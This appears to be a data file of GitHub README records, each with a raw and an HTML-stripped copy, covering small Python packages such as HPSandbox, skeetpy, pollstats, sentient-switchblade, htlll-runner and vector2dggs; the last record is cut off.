Contributors
~~~~~~~~~~~~

* Florent Xicluna (Wingo) 
* Nicolas Bessi 

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/server-env `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/server-env
hpsandbox,https://github.com/vvoelz/HPSandbox,1,4068,4019,"HPSandbox
===============

HPSandbox is a set of Python objects that allow you to quickly write simple python scripts
to explore the two-dimensional HP lattice model of proteins of Chan and Dill.


Last Updated:  March 2012

GETTING STARTED
===============

Installation
---------------

Please define the HPSANDBOXHOME environment variable to be this directory 

In bash: $ export HPSANDBOXHOME=/Users/vince/scripts/HPSandbox/trunk/HPSandbox

COPYRIGHT
---------------
This python package is Copyright (C) 2007 Vincent Voelz <voelz@temple.edu>.
Feel free to modify this code as needed, as long as you can keep it publicly available!



PACKAGE CONTENTS
---------------

  * Chain.py           An object to represent the 2D HP lattice chain and its attributes, with method functions.
  * Config.py          A data structure to hold configuration parameters.
  * Monty.py           A collection of functions to perform Monte Carlo move-set operations on the Chain() object.
  * Replica.py         A container object, to hold the Chain() and Monty() objects
  * Trajectory.py      A set of functions for creating, reading, writing, and organizing trajectory files

/examples          A directory of example scripts
/sequences         Containing descriptions of the native states of foldable sequences:
                       /clist - contact state lists for chain lengths 10 through 21
                       /conf  - coordinates (conformations) for chain lengths 10 through 19    
                       COUNTS - text file counts of all unique (nonsymmetric) conformations for a given chain length

This package has been tested with Python 2.3 and 2.4.   Older/newer versions may work too, but haven't been tested.

         
SETUP

In order to get these example scripts to work correctly, you need to set up the following:

  *  The HPSandbox directory (i.e python module) must be defined in your PYTHONPATH environment variable
  *  In the /examples folder mcrex.conf file needs to be changed to reflect the absolute pathname
   of the sequences/clist/hp**  directory.



EXAMPLE SCRIPTS

Please see the /examples directory and the README file therein for some test scripts and examples showing
how to use the HPSandbox function.


DOCUMENTATION

Documentation can be obtained using the pydoc standard module of python. For example:

    from HPSandbox import *
    import pydoc
    pydoc.help(Chain)


Frequently Asked Questions (FAQ)
===============

What can HPSandbox do?
----------------------
HPSandbox can either 1) enumerate, or 2) perform Monte Carlo ""dynamics"" for 2-dimensional, square-lattice ""bead-on-a-string"" type chains.

How long a chain can I simulate?
----------------------
It depends on how long you are willing to wait. For instance, all conformations of 16-mers can be enumerated in a few minutes on a typical personal computer. Each increase in chain length adds a factor of about 2.7 to the calculation.

Can I use other potentials besides the HP model?
----------------------
Sure! But you'll have to put it in yourself. The code is designed for HP sequences, so if you want to study a model using beads of only two flavors, it is easy to just modify theMonty.energy()class function. More complicated models would require a more thorough, but straightforward reworking of the code.

What are the reference(s) for the HP 2D Model?
----------------------
Lau, K.F. and K.A. Dill. A Lattice Statistical Mechanics Model of the Conformational and Sequence Spaces of Proteins. Macromolecules 22: 3986-3997 (1989).
Dill, K.A., S. Bromberg, K. Yue, K.M. Fiebig, D.P. Yee, P.D. Thomas, and H.S. Chan. Principles of Protein Folding - A Perspective From Simple Exact Models. Protein Science 4: 561-602, 1995.
Lau and Dill (1989) is the first use of the HP model, while Dill et al. (1995) is a more comprehensive review.

What movesets are used for the Monte Carlo routines in HPSandbox?
----------------------
The movesets are described in Dill et al. Protein Science 4: 561-602, 1995:

<img src=""images/movesets.png"">


Vincent Voelz
voelz@temple.edu
","HPSandbox
===============

HPSandbox is a set of Python objects that allow you to quickly write simple python scripts
to explore the two-dimensional HP lattice model of proteins of Chan and Dill.


Last Updated:  March 2012

GETTING STARTED
===============

Installation
---------------

Please define the HPSANDBOXHOME environment variable to be this directory 

In bash: $ export HPSANDBOXHOME=/Users/vince/scripts/HPSandbox/trunk/HPSandbox

COPYRIGHT
---------------
This python package is Copyright (C) 2007 Vincent Voelz .
Feel free to modify this code as needed, as long as you can keep it publicly available!



PACKAGE CONTENTS
---------------

  * Chain.py           An object to represent the 2D HP lattice chain and its attributes, with method functions.
  * Config.py          A data structure to hold configuration parameters.
  * Monty.py           A collection of functions to perform Monte Carlo move-set operations on the Chain() object.
  * Replica.py         A container object, to hold the Chain() and Monty() objects
  * Trajectory.py      A set of functions for creating, reading, writing, and organizing trajectory files

/examples          A directory of example scripts
/sequences         Containing descriptions of the native states of foldable sequences:
                       /clist - contact state lists for chain lengths 10 through 21
                       /conf  - coordinates (conformations) for chain lengths 10 through 19    
                       COUNTS - text file counts of all unique (nonsymmetric) conformations for a given chain length

This package has been tested with Python 2.3 and 2.4.   Older/newer versions may work too, but haven't been tested.

         
SETUP

In order to get these example scripts to work correctly, you need to set up the following:

  *  The HPSandbox directory (i.e python module) must be defined in your PYTHONPATH environment variable
  *  In the /examples folder mcrex.conf file needs to be changed to reflect the absolute pathname
   of the sequences/clist/hp**  directory.



EXAMPLE SCRIPTS

Please see the /examples directory and the README file therein for some test scripts and examples showing
how to use the HPSandbox function.


DOCUMENTATION

Documentation can be obtained using the pydoc standard module of python. For example:

    from HPSandbox import *
    import pydoc
    pydoc.help(Chain)


Frequently Asked Questions (FAQ)
===============

What can HPSandbox do?
----------------------
HPSandbox can either 1) enumerate, or 2) perform Monte Carlo ""dynamics"" for 2-dimensional, square-lattice ""bead-on-a-string"" type chains.

How long a chain can I simulate?
----------------------
It depends on how long you are willing to wait. For instance, all conformations of 16-mers can be enumerated in a few minutes on a typical personal computer. Each increase in chain length adds a factor of about 2.7 to the calculation.

Can I use other potentials besides the HP model?
----------------------
Sure! But you'll have to put it in yourself. The code is designed for HP sequences, so if you want to study a model using beads of only two flavors, it is easy to just modify theMonty.energy()class function. More complicated models would require a more thorough, but straightforward reworking of the code.

What are the reference(s) for the HP 2D Model?
----------------------
Lau, K.F. and K.A. Dill. A Lattice Statistical Mechanics Model of the Conformational and Sequence Spaces of Proteins. Macromolecules 22: 3986-3997 (1989).
Dill, K.A., S. Bromberg, K. Yue, K.M. Fiebig, D.P. Yee, P.D. Thomas, and H.S. Chan. Principles of Protein Folding - A Perspective From Simple Exact Models. Protein Science 4: 561-602, 1995.
Lau and Dill (1989) is the first use of the HP model, while Dill et al. (1995) is a more comprehensive review.

What movesets are used for the Monte Carlo routines in HPSandbox?
----------------------
The movesets are described in Dill et al. Protein Science 4: 561-602, 1995:




Vincent Voelz
voelz@temple.edu
",vvoelz/hpsandbox
skeetpy,https://github.com/nictuku/skeetpy,0,562,548,"# skeetpy
Implementation of the AT protocol in Python

## Authentication

```
atp = ATP(pds, identifier, password)
atp.authenticate()
```

## Methods

We generated code for the entire at/proto protocol, see skeetpy.py. That said, for now only the following methods are known to work:

```
atp.describe_server()      # show details about the current server
atp.list_app_passwords()   # list your app passwords
```

## Test the library against bsky.social
```
export PDS=bsky.social
export IDENTIFIER=yves.pt
export PASSWORD=<app password>

python3 skeetpy.py
```
","# skeetpy
Implementation of the AT protocol in Python

## Authentication

```
atp = ATP(pds, identifier, password)
atp.authenticate()
```

## Methods

We generated code for the entire at/proto protocol, see skeetpy.py. That said, for now only the following methods are known to work:

```
atp.describe_server()      # show details about the current server
atp.list_app_passwords()   # list your app passwords
```

## Test the library against bsky.social
```
export PDS=bsky.social
export IDENTIFIER=yves.pt
export PASSWORD=

python3 skeetpy.py
```
",nictuku/skeetpy
pollstats,https://github.com/Vijayanand-debug/pollstats,0,2117,2117,"=====
pollstats
=====

Pollstats is a Django app which display the entire number of Voters, calculates the percentage of voters who took part in the 
online poll. This library is exclusively designed for a college project and may not have all the dynamic features.

Quick start
-----------

1. Add ""pollstats.apps.PollstatsConfig"" to your INSTALLED_APPS setting like this::

    INSTALLED_APPS = [
        ...
        'pollstats.apps.PollstatsConfig',
    ]

2. Include the polls URLconf in your project urls.py like this::
    path('pollstats/',include(""pollstats.urls"")),

3. This library uses Django's default User Object and the data in it is accessed by using from django.contrib.auth.models import User

4. This library strictly uses the following models to calculate the data:
    
    class Events(models.Model):
     event_name = models.CharField(max_length=200)
     event_code = models.CharField(max_length=20)
     referal_code = models.CharField(max_length=20)
     hosted_by = models.ForeignKey(User, default=1, on_delete=models.CASCADE)
     event_description = models.TextField()
     event_status = models.IntegerField(default=0)
     starting_date = models.DateField(default=None)
     ending_date = models.DateField(default=None)

    class Options(models.Model):
     option_name = models.CharField(max_length=100)
     count = models.IntegerField(default=0)
     event_code = models.CharField(max_length=200)
    
    class Transactions(models.Model):
     voter = models.ForeignKey(User, default=1, on_delete=models.CASCADE)
     voting_time = models.DateTimeField(auto_now_add=True) 
     option_name = models.CharField(max_length=150)
     event_name = models.CharField(max_length=150)  
     event_code = models.CharField(max_length=70)
     referal_code = models.CharField(max_length=70)

5. Django admin can be used to insert the data in to Events table and also to insert initial data in to Options table with 
   count as 0

6. Then the count should be updated when a user votes/unvotes, the data in Transactions table must be inserted and deleted
   during the vote/unvote process

   

","=====
pollstats
=====

Pollstats is a Django app which display the entire number of Voters, calculates the percentage of voters who took part in the 
online poll. This library is exclusively designed for a college project and may not have all the dynamic features.

Quick start
-----------

1. Add ""pollstats.apps.PollstatsConfig"" to your INSTALLED_APPS setting like this::

    INSTALLED_APPS = [
        ...
        'pollstats.apps.PollstatsConfig',
    ]

2. Include the polls URLconf in your project urls.py like this::
    path('pollstats/',include(""pollstats.urls"")),

3. This library uses Django's default User Object and the data in it is accessed by using from django.contrib.auth.models import User

4. This library strictly uses the following models to calculate the data:
    
    class Events(models.Model):
     event_name = models.CharField(max_length=200)
     event_code = models.CharField(max_length=20)
     referal_code = models.CharField(max_length=20)
     hosted_by = models.ForeignKey(User, default=1, on_delete=models.CASCADE)
     event_description = models.TextField()
     event_status = models.IntegerField(default=0)
     starting_date = models.DateField(default=None)
     ending_date = models.DateField(default=None)

    class Options(models.Model):
     option_name = models.CharField(max_length=100)
     count = models.IntegerField(default=0)
     event_code = models.CharField(max_length=200)
    
    class Transactions(models.Model):
     voter = models.ForeignKey(User, default=1, on_delete=models.CASCADE)
     voting_time = models.DateTimeField(auto_now_add=True) 
     option_name = models.CharField(max_length=150)
     event_name = models.CharField(max_length=150)  
     event_code = models.CharField(max_length=70)
     referal_code = models.CharField(max_length=70)

5. Django admin can be used to insert the data in to Events table and also to insert initial data in to Options table with 
   count as 0

6. Then the count should be updated when a user votes/unvotes, the data in Transactions table must be inserted and deleted
   during the vote/unvote process

   

",vijayanand-debug/pollstats
sentient-switchblade,https://github.com/jensroland/sentient-switchblade,5,8172,6318,"<!-- markdownlint-disable first-line-h1 line-length no-inline-html -->
<p align=""center"">
  <a href=""https://github.com/JensRoland/sentient-switchblade"">
    <img src=""https://jensroland.com/switchblade/assets/switchblade-logotype.png"" width=""415px"" alt=""Switchblade logo"" />
  </a>
</p>

<h3 align=""center"">Unleash Dev Tool Mastery with a Flick of Your Wrist</h3>
<p align=""center"">Created by <a href=""https://jensroland.com/"">Jens Roland</a></p>

<br />

## ⚔️ What is Switchblade?

Switchblade is a command line tool that lets you install and run dev tools from a central repository, and configure them in a standardised way across all your projects.

## Try it

To use the included `python-poetry-base` bundle for Python, create a `.switchblade` file in your project root:

```toml
[switchblade]
bundle = ""gh:jensroland/sentient-switchblade/bundles/python-poetry-base""
mode = ""python-poetry""
```

Then, install Switchblade in your project and call `swb lint` to run the standard Python linters configured in the base bundle:

```shell
# Install Switchblade
poetry add -G dev sentient-switchblade

# Run linters from the bundle
poetry run swb lint
```

That's it! :tada: Switchblade will fetch the bundle from Github, install the tools specified in the bundle, and run them with the configurations specified in the bundle. No need to install or configure anything yourself, and no need to commit any dev tooling to your project repo.

**Note**: The base bundle assumes that your source code lives under `src/` and your tests under `tests/`, but it is only meant as an example. To specify your own dev tools and tailor them to your needs and project structure, create your own custom bundle (see below).

## Who is this for?

Switchblade was born from the question: *""How do I ensure that I'm using the same linting and testing configurations across all of my project repositories?""* Are all of your Python repos using the same version of `Black`? Maybe you switched to `flake8` on your newer repos but never updated the old ones? Sure, maybe it doesn't matter very much if your tooling deviates a little between your personal projects, but how about this: when your company's DevSecOps team updated all the templates to include scans for known vulnerabilities and credential leaks, did you remember to update all of your repos? And if not, how would you even know?

To complicate matters, developer tooling is not simply about choosing a particular linter and firing it up. It's also how you configure it -- maximum line lengths, whether to use single or double quotes, what rules to ignore entirely -- as well as which arguments to pass when you invoke it.

<!-- Every software engineering organisation has to deal with these issues, and while many solutions exist, they are hardly perfect:

1. Provide project templates with dev tooling built-in, and use those templates to create new projects. This works well initially, but results in duplicated configuration files and makes all subsequent configuration updates both time consuming and error prone, since they have to be made in all projects at once.
2. Let configs be duplicated across projects and use [a meta-repo tool](https://github.com/mateodelnorte/meta) to perform cross-repo updates. This requires a non-trivial amount of setup and maintenance, and updating a dev configuration still requires committing changes in every repo.
3. Combine all dev tooling in a package and install it in every project. This works for some types of tooling, but many tools require their config files to exist in the project root rather than inside a package. It also usually requires committing changes (e.g. the updated lockfile) in every repo to get the latest configurations.
4. Use a monorepo; have one set of dev tools included in the repo and use it for everything. This can actually be a great solution, but it's not always possible or desirable to use a monorepo.
5. Something custom involving Docker containers and prebaked images with dev tools. This involves a lot of complexity and overhead, plus you get all the limitations of the package solution. -->

In an ideal world, dev tooling would not be checked into version control (*seriously*) but rather **fetched on demand from a centrally managed dev tooling repository, and configured and invoked in exactly the same way in every repo, every time**. This would allow for a single source of truth for all dev tooling, and would make it easy to update configurations across all projects.

To achieve this however, you would need some kind of small helper tool to abstract away the fetching, configuring and invoking of your centrally curated 'bundles' of dev tools.

Switchblade is that tool.

## Custom bundles

To create your own custom bundle with the dev tools and configurations you need, simply create a new Github repo and add a `bundle.toml` file to it:

```toml
[bundle]
name = ""my-dev-tool-bundle""
mode = ""python-poetry""
schema_version = ""1.0.0""

# Linters
[linters]
all = [""pylint""]

[linters.pylint]
command = ""pylint src""

# Tests
[tests]
all = [""pytest""]

[tests.pytest]
command = ""pytest -c pyproject.toml tests""

# Extensions to pyproject.toml
[tool.poetry.group.switchblade]
optional = true

[tool.poetry.group.switchblade.dependencies]
pylint = ""^2.17.2""
pytest = ""^7.3.1""

[tool.pytest.ini_options]
pythonpath = ""src""
```

For each linter you want to add, specify a `[linters.<toolname>]` section with a `command` key. The `command` value will be invoked by Switchblade when you run `swb lint <toolname>`.

The `[linters]` section specifies which linters should be invoked (and in which order) when you run `swb lint` or `swb lint all`.

The same goes for tests: specify a `[tests.<toolname>]` section with a `command` key, and add the tool to the `[tests]` section to have it invoked when you run `swb test` or `swb test all`.

### Tool configuration

Anything in the `bundle.toml` file under a `tool.*` section will be temporarily added to the project's `pyproject.toml` file under that section. This allows you to add dependencies and configuration options to all your projects without having to manually edit all the individual `pyproject.toml` files.

If you prefer having separate config files, or for tools which do not support `pyproject.toml` configuration, simply add any config files you need in the same folder as the `bundle.toml` file. E.g. you might define a `.pylintrc` in the bundle repo:

```ini
[MAIN]
[MESSAGES CONTROL]
disable=
    C0111,  # missing-docstring
    C0114,  # missing-module-docstring
    C0115,  # missing-class-docstring
    C0116,  # missing-function-docstring
    W0613,  # unused-argument
```

Now, when you want to use your custom dev tool bundle in a project, simply point to the repo in the project `.switchblade` file as in the example above. Swichblade will then fetch and install the tools you specified in the bundle and run them with the configurations you specified.

### Per-project overrides

To override the bundle configuration for a specific dev tool in one of your project repos, simply check in the tool dependencies and configuration files in the project repo as you normally would - Switchblade will still invoke the dev tool, but it will not overwrite any existing config files or `[tool.*]` sections in your `pyproject.toml` file. Be aware that this does not 'extend' the configuration from the bundle, but replaces that tool configuration entirely, so this feature should be used with caution.

To override the command or the list of linters to run, add the corresponding sections (e.g. `[linters]` or `[linters.pylint]` in the project `.switchblade` file. Switchblade will automatically merge (in this case it does extend rather than replace) the bundle config and Switchblade config before invoking any of the tools.

## Prerequisites

- [Python 3.7+](https://www.python.org/downloads/)

Currently, you need Python since you install Switchblade with pip. This may change in the future.

## Features

- CLI command `swb lint` to run linters
- CLI command `swb test` to run tests
- Project 'modes' supported: Currently only `python-poetry` is supported, but more will be added soon.
","





Unleash Dev Tool Mastery with a Flick of Your Wrist
Created by Jens Roland


## ⚔️ What is Switchblade?

Switchblade is a command line tool that lets you install and run dev tools from a central repository, and configure them in a standardised way across all your projects.

## Try it

To use the included `python-poetry-base` bundle for Python, create a `.switchblade` file in your project root:

```toml
[switchblade]
bundle = ""gh:jensroland/sentient-switchblade/bundles/python-poetry-base""
mode = ""python-poetry""
```

Then, install Switchblade in your project and call `swb lint` to run the standard Python linters configured in the base bundle:

```shell
# Install Switchblade
poetry add -G dev sentient-switchblade

# Run linters from the bundle
poetry run swb lint
```

That's it! :tada: Switchblade will fetch the bundle from Github, install the tools specified in the bundle, and run them with the configurations specified in the bundle. No need to install or configure anything yourself, and no need to commit any dev tooling to your project repo.

**Note**: The base bundle assumes that your source code lives under `src/` and your tests under `tests/`, but it is only meant as an example. To specify your own dev tools and tailor them to your needs and project structure, create your own custom bundle (see below).

## Who is this for?

Switchblade was born from the question: *""How do I ensure that I'm using the same linting and testing configurations across all of my project repositories?""* Are all of your Python repos using the same version of `Black`? Maybe you switched to `flake8` on your newer repos but never updated the old ones? Sure, maybe it doesn't matter very much if your tooling deviates a little between your personal projects, but how about this: when your company's DevSecOps team updated all the templates to include scans for known vulnerabilities and credential leaks, did you remember to update all of your repos? And if not, how would you even know?

To complicate matters, developer tooling is not simply about choosing a particular linter and firing it up. It's also how you configure it -- maximum line lengths, whether to use single or double quotes, what rules to ignore entirely -- as well as which arguments to pass when you invoke it.



In an ideal world, dev tooling would not be checked into version control (*seriously*) but rather **fetched on demand from a centrally managed dev tooling repository, and configured and invoked in exactly the same way in every repo, every time**. This would allow for a single source of truth for all dev tooling, and would make it easy to update configurations across all projects.

To achieve this however, you would need some kind of small helper tool to abstract away the fetching, configuring and invoking of your centrally curated 'bundles' of dev tools.

Switchblade is that tool.

## Custom bundles

To create your own custom bundle with the dev tools and configurations you need, simply create a new Github repo and add a `bundle.toml` file to it:

```toml
[bundle]
name = ""my-dev-tool-bundle""
mode = ""python-poetry""
schema_version = ""1.0.0""

# Linters
[linters]
all = [""pylint""]

[linters.pylint]
command = ""pylint src""

# Tests
[tests]
all = [""pytest""]

[tests.pytest]
command = ""pytest -c pyproject.toml tests""

# Extensions to pyproject.toml
[tool.poetry.group.switchblade]
optional = true

[tool.poetry.group.switchblade.dependencies]
pylint = ""^2.17.2""
pytest = ""^7.3.1""

[tool.pytest.ini_options]
pythonpath = ""src""
```

For each linter you want to add, specify a `[linters.]` section with a `command` key. The `command` value will be invoked by Switchblade when you run `swb lint `.

The `[linters]` section specifies which linters should be invoked (and in which order) when you run `swb lint` or `swb lint all`.

The same goes for tests: specify a `[tests.]` section with a `command` key, and add the tool to the `[tests]` section to have it invoked when you run `swb test` or `swb test all`.

### Tool configuration

Anything in the `bundle.toml` file under a `tool.*` section will be temporarily added to the project's `pyproject.toml` file under that section. This allows you to add dependencies and configuration options to all your projects without having to manually edit all the individual `pyproject.toml` files.

If you prefer having separate config files, or for tools which do not support `pyproject.toml` configuration, simply add any config files you need in the same folder as the `bundle.toml` file. E.g. you might define a `.pylintrc` in the bundle repo:

```ini
[MAIN]
[MESSAGES CONTROL]
disable=
    C0111,  # missing-docstring
    C0114,  # missing-module-docstring
    C0115,  # missing-class-docstring
    C0116,  # missing-function-docstring
    W0613,  # unused-argument
```

Now, when you want to use your custom dev tool bundle in a project, simply point to the repo in the project `.switchblade` file as in the example above. Swichblade will then fetch and install the tools you specified in the bundle and run them with the configurations you specified.

### Per-project overrides

To override the bundle configuration for a specific dev tool in one of your project repos, simply check in the tool dependencies and configuration files in the project repo as you normally would - Switchblade will still invoke the dev tool, but it will not overwrite any existing config files or `[tool.*]` sections in your `pyproject.toml` file. Be aware that this does not 'extend' the configuration from the bundle, but replaces that tool configuration entirely, so this feature should be used with caution.

To override the command or the list of linters to run, add the corresponding sections (e.g. `[linters]` or `[linters.pylint]` in the project `.switchblade` file. Switchblade will automatically merge (in this case it does extend rather than replace) the bundle config and Switchblade config before invoking any of the tools.

## Prerequisites

- [Python 3.7+](https://www.python.org/downloads/)

Currently, you need Python since you install Switchblade with pip. This may change in the future.

## Features

- CLI command `swb lint` to run linters
- CLI command `swb test` to run tests
- Project 'modes' supported: Currently only `python-poetry` is supported, but more will be added soon.
",jensroland/sentient-switchblade
fitransit,https://github.com/troyzx/fitransit,0,106,106,"# fitransit

 A fast tool to fit transit light curve.

## Installation

```bash
pip install fitransit
```
","# fitransit

 A fast tool to fit transit light curve.

## Installation

```bash
pip install fitransit
```
",troyzx/fitransit
htlll-runner,https://github.com/Moosems/htlll_runner,1,5229,2774,"<h1 align=""center"">HyperText Low Level Language<h1>

# Description

HyperText Low Level Language is a low level language similar in looks to `HTML`. It is designed to be easy to read and write, but works low level and translates almost directly into the type of code you write into the terminal with the exception of some tags shown below.

```html

# HTLLL works by using bash commands in order
# The following script will create a directory called testDir, 
# make 5 files in it, use ls, and then delete the directory
# In normal bash this would be: 
# mkdir testDir; cd testDir; touch file1 file2 file3 file4 file5; ls; cd ..; rm -rf testDir
# This will now be written in HTLLL:

# In HTLLL, as you probably suspected, comments use the hash symbol
# Each HTLLL file starts with the <kernel> tag and ends with the </kernel> tag
<kernel>
    # The import tag allows you to import builtin python modules
    <import>
        # And the module tag allows you to specify the module to import
        <module>
            os
        </module>
    </import>
    # To set variables you must use the <envVars> tag
    <envVars>
        # Variables are set using the <var> tag
        <var name=""dirToMake"">
            # You set the value of the variable in between the <var> tag
            # In this case however, I want the user to be able to set the value
            # So I use the <input> tag
            <input>
                # The input tag has an inner <prompt> tag
                # The prompt tag is the text that will be displayed to the user
                <prompt>
                    Enter the name of the directory to make:
                </prompt>
            </input>
        </var>
        # Get the system (""Linux"", ""Darwin"", ""Windows)
        <var name=""system"">
            # To get a value from a python module you must use the <py> tag
            # The <py> tag has an inner <module> tag and an inner <function> tag or <value> tag
            <py>
                <module>
                    os
                </module>
                <var sysInfo=""system"">
                    <function>
                        uname
                    </function>
                </var>
                # To get the name of the system you must use the <value> tag
                <value name=""sysname"">
                    <var sysInfo=""system""/>
                </value>
            </py>
        </var>
        # And this sets the value of ""system"" to the value of os.uname().sysname
    </envVars>
    # Each base tag is a command and all commands run in order
    # To run a command you make a tag with the command name inside
    <mkdir>
        # Allowed inner tags are options and args
        # Options allow things like -r or --version
        <args>
            # To use a variable you must use the <var> tag 
            # and add an ""/"" at the end to signify its not being set or 
            # that the tag is one without an inner tag.
            # To make the value the literal string ""<var name=""dirToMake""/>""
            # you must use the <literal> tag
            <var name=""dirToMake""/>
        </args>
    </mkdir>
    <cd>
        <args>
            <var name=""dirToMake""/>
        </args>
    </cd>
    # The <script> tag allows for if statements, for loops, while loops, and functions
    # All functions must be defined in the envVars tag
    # Script if else statements and for loops can be used in the normal kernel
    <script>
        # In the script tag everything is either python or bash
        # for, while, if, elif, else, and functions are python
        # Everything else is bash
        for i in range(5):
            <touch>
                <args>
                    # To use variables inside of a line you use {$varName}
                    # Again, to use the literal string ""{$varName}"" you must use the <literal> tag
                    file{$i}
                </args>
            </touch>
    </script>
    # For single line bash commands you are not required to use an end tag
    <ls>
    <cd>
        <args>
            ..
        </args>
    </cd>
    <rm>
        <option>
            -rf
        </option>
        <args>
            <var name=""dirToMake""/>
        </args>
    </rm>
</kernel>
```

The special tags are:
- `<input>`: Allows the user to input a value
- `<py>`: Allows you to use python modules
- `<script>`: Allows you to use python and bash
- `<literal>`: Allows you to use the literal string of the inner tag
- `<var>`: Allows you to use variables
- `<option>`: Allows you to use options
- `<args>`: Allows you to use arguments
- `<envVars>`: Allows you to set variables
- `<import>`: Allows you to import python modules
- `<module>`: Allows you to specify the module to import
- `<function>`: Allows you to specify the function to use
- `<value>`: Allows you to specify the value to use
- `<kernel>`: The main tag that contains all the other tags

# Installation
To install HTLLL you must have python3 installed. Then you can install HTLLL by running the following command:
```bash
pip3 install htlll_runner
```

# Usage
Once you have installed HTLLL you can run it by running the following command:
```bash
htlll_runner ""path/to/file.htlll""
```

","HyperText Low Level Language

# Description

HyperText Low Level Language is a low level language similar in looks to `HTML`. It is designed to be easy to read and write, but works low level and translates almost directly into the type of code you write into the terminal with the exception of some tags shown below.

```html

# HTLLL works by using bash commands in order
# The following script will create a directory called testDir, 
# make 5 files in it, use ls, and then delete the directory
# In normal bash this would be: 
# mkdir testDir; cd testDir; touch file1 file2 file3 file4 file5; ls; cd ..; rm -rf testDir
# This will now be written in HTLLL:

# In HTLLL, as you probably suspected, comments use the hash symbol
# Each HTLLL file starts with the  tag and ends with the  tag

    # The import tag allows you to import builtin python modules
    
        # And the module tag allows you to specify the module to import
        
            os
        

    # To set variables you must use the  tag
    
        # Variables are set using the  tag
        
            # You set the value of the variable in between the  tag
            # In this case however, I want the user to be able to set the value
            # So I use the  tag
            
                # The input tag has an inner  tag
                # The prompt tag is the text that will be displayed to the user
                
                    Enter the name of the directory to make:
                

        # Get the system (""Linux"", ""Darwin"", ""Windows)
        
            # To get a value from a python module you must use the  tag
            # The  tag has an inner  tag and an inner  tag or  tag
            

                    os
                


                        uname
                    

                # To get the name of the system you must use the  tag
                




        # And this sets the value of ""system"" to the value of os.uname().sysname
    
    # Each base tag is a command and all commands run in order
    # To run a command you make a tag with the command name inside
    
        # Allowed inner tags are options and args
        # Options allow things like -r or --version
        
            # To use a variable you must use the  tag 
            # and add an ""/"" at the end to signify its not being set or 
            # that the tag is one without an inner tag.
            # To make the value the literal string """"
            # you must use the  tag
            







    # The 
    # For single line bash commands you are not required to use an end tag
    


            ..
        



            -rf
        





```

The special tags are:
- ``: Allows the user to input a value
- ``: Allows you to use python modules
- `",moosems/htlll_runner
vector2dggs,https://github.com/manaakiwhenua/vector2dggs,13,7920,7920,"# vector2dggs

[![pypi](https://img.shields.io/pypi/v/vector2dggs?label=vector2dggs)](https://pypi.org/project/vector2dggs/)

Python-based CLI tool to index raster files to DGGS in parallel, writing out to Parquet.

This is the vector equivalent of [raster2dggs](https://github.com/manaakiwhenua/raster2dggs).

Currently only supports H3 DGGS, and probably has other limitations since it has been developed for a specific internal use case, though it is intended as a general-purpose abstraction. Contributions, suggestions, bug reports and strongly worded letters are all welcome.

Currently only supports polygons; but both coverages (strictly non-overlapping polygons), and sets of polygons that do/may overlap, are supported. Overlapping polygons are captured by ensuring that DGGS cell IDs may be non-unique (repeated) in the output.

![Example use case for vector2dggs, showing parcels indexed to a high H3 resolution](./docs/imgs/vector2dggs-example.png ""Example use case for vector2dggs, showing parcels indexed to a high H3 resolution"")

## Installation

```bash
pip install vector2dggs
```

## Usage

```bash
vector2dggs h3 --help
Usage: vector2dggs h3 [OPTIONS] VECTOR_INPUT OUTPUT_DIRECTORY

  Ingest a vector dataset and index it to the H3 DGGS.

  VECTOR_INPUT is the path to input vector geospatial data. OUTPUT_DIRECTORY
  should be a directory, not a file, as it will be the write location for an
  Apache Parquet data store.

Options:
  -v, --verbosity LVL             Either CRITICAL, ERROR, WARNING, INFO or
                                  DEBUG  [default: INFO]
  -r, --resolution [0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15]
                                  H3 resolution to index  [required]
  -id, --id_field TEXT            Field to use as an ID; defaults to a
                                  constructed single 0...n index on the
                                  original feature order.
  -k, --keep_attributes           Retain attributes in output. The default is
                                  to create an output that only includes H3
                                  cell ID and the ID given by the -id field
                                  (or the default index ID).
  -p, --partitions INTEGER        The number of partitions to create.
                                  Recommendation: at least as many partitions
                                  as there are available `--threads`.
                                  Partitions are processed in parallel once
                                  they have been formed.  [default: 50;
                                  required]
  -s, --spatial_sorting [hilbert|morton|geohash]
                                  Spatial sorting method when perfoming
                                  spatial partitioning.  [default: hilbert]
  -crs, --cut_crs INTEGER         Set the coordinate reference system (CRS)
                                  used for cutting large polygons (see `--cur-
                                  threshold`). Defaults to the same CRS as the
                                  input. Should be a valid EPSG code.
  -c, --cut_threshold INTEGER     Cutting up large polygons into smaller
                                  pieces based on a target length. Units are
                                  assumed to match the input CRS units unless
                                  the `--cut_crs` is also given, in which case
                                  units match the units of the supplied CRS.
                                  [default: 5000; required]
  -t, --threads INTEGER           Amount of threads used for operation
                                  [default: 7]
  -tbl, --table TEXT              Name of the table to read when using a
                                  spatial database connection as input
  -g, --geom_col TEXT             Column name to use when using a spatial
                                  database connection as input  [default:
                                  geom]
  -o, --overwrite
  --help                          Show this message and exit.

```

### Example 




## Visualising output

Output is in the Apache Parquet format, a directory with one file per partition.

For a quick view of your output, you can read Apache Parquet with pandas, and then use h3-pandas and geopandas to convert this into a GeoPackage or GeoParquet for visualisation in a desktop GIS, such as QGIS. The Apache Parquet output is indexed by an ID column (which you can specify), so it should be ready for two intended use-cases:
- Joining attribute data from the original feature-level data onto computer DGGS cells.
- Joining other data to this output on the H3 cell ID. (The output has a column like `h3_\d{2}`, e.g. `h3_09` or `h3_12` according to the target resolution.)

Geoparquet output (hexagon boundaries):

```python
>>> import pandas as pd
>>> import h3pandas
>>> g = pd.read_parquet('./output-data/nz-property-titles.12.parquet').h3.h3_to_geo_boundary()
>>> g
                  title_no                                           geometry
h3_12                                                                        
8cbb53a734553ff  NA94D/635  POLYGON ((174.28483 -35.69315, 174.28482 -35.6...
8cbb53a734467ff  NA94D/635  POLYGON ((174.28454 -35.69333, 174.28453 -35.6...
8cbb53a734445ff  NA94D/635  POLYGON ((174.28416 -35.69368, 174.28415 -35.6...
8cbb53a734551ff  NA94D/635  POLYGON ((174.28496 -35.69329, 174.28494 -35.6...
8cbb53a734463ff  NA94D/635  POLYGON ((174.28433 -35.69335, 174.28432 -35.6...
...                    ...                                                ...
8cbb53a548b2dff  NA62D/324  POLYGON ((174.30249 -35.69369, 174.30248 -35.6...
